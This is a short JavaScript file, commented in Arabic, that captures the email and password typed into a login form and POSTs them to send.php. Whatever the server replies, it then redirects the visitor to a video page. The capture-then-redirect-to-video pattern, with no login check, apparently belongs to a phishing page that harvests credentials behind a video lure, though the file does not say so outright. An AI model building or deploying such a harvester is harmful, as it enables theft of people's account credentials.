document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    // إرسال البيانات إلى `send.php`
    fetch("send.php", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: "email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password)
    })
    .then(response => response.text())
    .then(data => {
        console.log("تم إرسال البيانات بنجاح:", data);
        window.location.href = "video.html"; // تحويل المستخدم إلى الفيديو
    })
    .catch(error => {
        console.error("حدث خطأ أثناء الإرسال:", error);
    });
});
